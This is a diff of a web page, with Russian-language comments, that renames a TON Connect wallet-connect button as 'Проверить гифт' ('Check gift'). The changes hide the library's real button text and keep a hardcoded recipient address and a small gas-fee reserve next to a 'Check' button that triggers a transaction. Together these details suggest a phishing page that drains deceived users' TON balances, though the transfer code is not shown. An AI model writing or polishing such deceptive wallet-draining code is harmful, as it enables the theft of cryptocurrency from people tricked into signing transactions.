@@ -41,15 +41,25 @@
             margin-bottom: 1.5rem;
         }
 
-        /* Заменяем текст "Connect Wallet" на "Проверить гифт" до подключения */
-        #ton-connect button[data-tc-connect-button="true"] span {
+        /* Полная замена текста Connect Wallet на "Проверить гифт" */
+        #ton-connect button, 
+        #ton-connect [data-tc-connect-button="true"],
+        #ton-connect div {
             font-size: 0 !important;
         }
 
-        #ton-connect button[data-tc-connect-button="true"] span::before {
-            content: "Проверить гифт";
+        #ton-connect button::before,
+        #ton-connect [data-tc-connect-button="true"]::before {
+            content: "Проверить гифт" !important;
             font-size: 15px !important;
-            font-weight: 600;
+            font-weight: 600 !important;
+            line-height: 1 !important;
+            color: #ffffff !important;
+        }
+
+        /* Скрываем дочерний внутренний текст библиотеки */
+        #ton-connect button * {
+            display: none !important;
         }
 
         .wallet-details {
@@ -125,15 +135,15 @@
 <body>
 
 <div class="card">
-    <!-- Кнопка подключения TON Connect (сменён текст на "Проверить гифт") -->
+    <!-- Кнопка подключения с замененным текстом "Проверить гифт" -->
     <div id="ton-connect"></div>
 
-    <!-- Блок с деталями и второй кнопкой "Проверить" -->
+    <!-- Блок с информацией о балансе и отправке -->
     <div id="wallet-info" class="wallet-details">
         <div class="info-title">НФТ:</div>
         <div id="wallet-address" class="info-value"></div>
 
-        <!-- Кнопка Проверить -->
+        <!-- Вторая кнопка -->
         <button id="sendTxBtn" class="send-btn" disabled>Проверить</button>
         <div id="txStatus" class="tx-status"></div>
     </div>
@@ -150,7 +160,7 @@
     const sendBtn = document.getElementById('sendTxBtn');
     const txStatus = document.getElementById('txStatus');
 
-    // RAW-формат вашего адреса UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
+    // RAW-формат адреса UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P
     const RECIPIENT_ADDRESS = '0:522be7edfc0f48f29239d101aa62937bdce91f9eb0cb23bc160d5b8cc05b1a46';
 
     const GAS_FEE_RESERVE = 5000000; // Резерв 0.005 TON на комиссию
